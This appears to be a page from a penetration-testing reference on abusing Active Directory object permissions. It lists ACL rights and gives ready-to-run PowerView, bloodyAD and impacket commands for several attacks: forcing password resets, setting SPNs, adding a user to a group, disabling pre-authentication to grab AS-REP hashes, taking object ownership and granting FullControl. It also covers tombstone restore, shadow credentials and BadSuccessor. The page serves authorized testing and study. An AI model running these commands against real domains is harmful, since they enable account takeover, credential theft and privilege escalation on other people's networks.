# AD object rights and advanced paths

[← Active Directory quick reference](../05-active-directory.md) · [ACL discovery](spn-acl-shares.md#object-acls)

For each edge: principal + right + target + original value. Verify the right.

## User and group rights

| Right | Check or use |
| --- | --- |
| `ForceChangePassword` | Can you reset this user's password? |
| `GenericWrite` or `GenericAll` on a user | Can you change an SPN, pre-auth flag, or another useful attribute? |
| `GenericAll` on a group | Can you add your principal as a member? |
| `WriteOwner` or `WriteDACL` | Can you gain the needed edit right while preserving the original owner and ACL? |

PowerView:

```powershell
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}
net group "Target Group" me /add /domain
```

Write user UAC → targeted AS-REP; restore flag:

```bash
bloodyAD -u me -p pass -d corp.example --host <dc-ip> add uac victim -f DONT_REQ_PREAUTH
impacket-GetNPUsers corp.example/ -dc-ip <dc-ip> -request-user victim -no-pass -format hashcat
bloodyAD -u me -p pass -d corp.example --host <dc-ip> remove uac victim -f DONT_REQ_PREAUTH
```

Owner path: save original owner + ACL:

```bash
impacket-owneredit -action write -new-owner me -target victim 'corp.example/me:pass'
impacket-dacledit -action write -rights FullControl -principal me -target victim 'corp.example/me:pass'
```

## Sealed LDAP, object restore & newer primitives

`strongerAuthRequired`: use Kerberos/sealed LDAP or test LDAPS.

```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local get writable
```

Tombstone restore: write right on object + create-child in destination OU:

```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local set restore <deleted-object> \
  --newParent OU=Employees,DC=corp,DC=local
```

Shadow credentials need writable `msDS-KeyCredentialLink` + PKINIT. `KDC_ERR_PADATA_TYPE_NOSUPP` → check DC support.

BadSuccessor/dMSA: check DC patch state and rights over both dMSA and target. [Research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) · [patch](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch).
